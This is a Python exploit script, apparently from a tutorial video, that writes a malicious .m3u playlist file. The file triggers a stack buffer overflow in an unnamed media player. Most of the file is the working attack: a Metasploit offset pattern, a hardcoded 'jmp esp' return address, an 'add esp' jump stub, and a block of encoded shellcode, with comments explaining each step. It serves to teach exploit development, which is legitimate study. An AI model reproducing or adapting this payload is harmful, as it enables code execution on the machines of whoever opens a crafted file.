import struct

#Notes
#i could not show you complete tutorial of procedure
#becoz i failed lot of times ,took hours :(
#and i replaced same m3u file many times
#and finally its worked
#one day i will definitely post full procedure of this

#in this method we are going to see when we have less buffer size
#this means that suppose if only first 50bytes are available to place our
#shellcode then its a problem becoz we cant place in 50bytes

#so this method will become helpful in finding memory area where our stack
#is full of junk and we find the way to jump to that junk memory area
 #and execute our shellcode

#first we need to find where our A's are going to store after null chars in 
#stack

#for that fuzz esp with 50X's (this is our available space for shellcode),
#and remaining with some nops say 300

#then in our stack at lower position A's start at 
#this address
#000FFE94(97)   41009090    혨혨.A  esp+15c

#wait how do A's came into our stack?
#those are A's that we filled up buffer upto eip (remember junk 26064 in my case)
#so some of A's of junk were filled up in stack
#esp + 15c
#and by the way A's start at esp+15c

#but where does that offset begin(from which A our lower stack is filled)
#so we create pattern using metasploit and find offset using pattern_offset

#i got offset 328 
#that means after 327 A's 328th A fall at our lower position of stack
#so we can place our shellcode here becoz there is much more space

#this is pattern used
pattern='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'

pattern=pattern.encode('raw_unicode_escape')

#we got
#000FFE94   41009090  혨혨.A
#000FFE98   6C41396B  k9Al
#pattern of k9Al at 328 offset

# i got 328 offset 

#so now we create 320 A's and some nops and our shellcode and remaining A's

#so our lower stack will have nops + shellcode + A's


#esp+15c
#7c901211 add esp,0x5e
#add esp,0x5e
#7c901214 add esp,0x5e
#add esp,0x5e
#7c901217 jmp esp

# ihad already calculated and showed you int 03 breakpoint
#now we need to jump to esp+15c address or more than that address
#becoz after that address only our A's has started
#and before that we have NULL CHARACTERS


#add something larger than 15c (in my case)

#0:010> u 7c901211
#ntdll!DbgBreakPoint+0x3:
#7c901211 83c45e          add     esp,5Eh
#7c901214 83c45e          add     esp,5Eh
#7c901217 ffe4            jmp     esp

#opcode for add esp add esp and jmp esp is
#0x830xc40x5e0x830xc40x5e0xffe4  
#i found using windbg

#now we had placed our jumpcode into esp which jumps into esp+15c or more than that
#lets replace breakpoint with our calculator shellcode

#junk='A'*25064
junk='A'*320

junk=junk.encode('raw_unicode_escape')

nops1='\x90'*50
nops1=nops1.encode('raw_unicode_escape')

#shellcode='\xcc'

shellcode=("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")



shellcode=shellcode.encode('raw_unicode_escape')

remainingjunk='A' * (26064-len(nops1)-len(junk)-len(shellcode))
remainingjunk=remainingjunk.encode('raw_unicode_escape')
#print(len(junk))


#eip='B'*4
#this is our address i found jmp esp one before in jmp esp method
eip=struct.pack('<I',0x7C8369F0)


beforeesp='C'*4
beforeesp=beforeesp.encode('raw_unicode_escape')

jump='\x83\xc4\x5e\x83\xc4\x5e\xff\xe4'
jump=jump.encode('raw_unicode_escape')

buffer1=junk+nops1+shellcode+remainingjunk


esp='X'*50
esp=esp.encode('raw_unicode_escape')

nops='\x90'*300
nops=nops.encode('raw_unicode_escape')

#A's + jmp esp + BBBB + jmp to esp+15c or more
#esp+15c have our shellcode which we written as 320 A's and few nops and shellcode

overflow=buffer1+eip+beforeesp+jump	

#finally writing into file :) 
f=open("C:\\Users\\nikki\\Desktop\\exploit_development_python\\smallbuffer.m3u","wb")
f.write(overflow)
f.close()
print("file created successfully")



#THANKS FOR WATCHING
#SUBSCRIBE FOR MORE TUTORIALS
#I DEFINITELY DO FULL PROCEDURE ON ONE DAY

